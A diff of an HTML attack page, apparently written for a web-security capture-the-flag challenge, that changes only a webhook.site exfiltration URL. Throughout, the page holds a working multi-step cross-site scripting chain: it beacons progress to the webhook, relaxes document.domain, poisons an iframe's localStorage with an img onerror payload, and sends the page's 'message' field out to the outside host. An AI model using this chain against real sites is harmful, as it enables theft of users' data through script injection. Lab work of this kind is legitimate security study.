@@ -3,7 +3,7 @@
 <body>
     <script>
         // STEP 1: Did the bot even load the GitHub page?
-        const W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
+        const W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
         new Image().src = W + "/?step=1_github_started";
     </script>
 
@@ -23,7 +23,7 @@
             // We write the Diary XSS as plain text, then Base64 encode it 
             // to prevent the server from breaking our quotes or tags.
             const diaryJS = `
-                var W = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
+                var W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
                 new Image().src = W + "/?step=3_diary_xss_running";
                 document.domain = "owley-madison.jeopardy.websec.saarland";
                 
@@ -32,7 +32,7 @@
                 f.onload = function() {
                     new Image().src = W + "/?step=4_iframe_loaded";
                     try {
-                        var payload = '</option><img src=x onerror="new Image().src=\\'https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)">';
+                        var payload = '</option><img src=x onerror="new Image().src=\\'https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)">';
                         f.contentWindow.localStorage.setItem("favorites", JSON.stringify([payload]));
                         new Image().src = W + "/?step=5_storage_poisoned";
                         window.location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
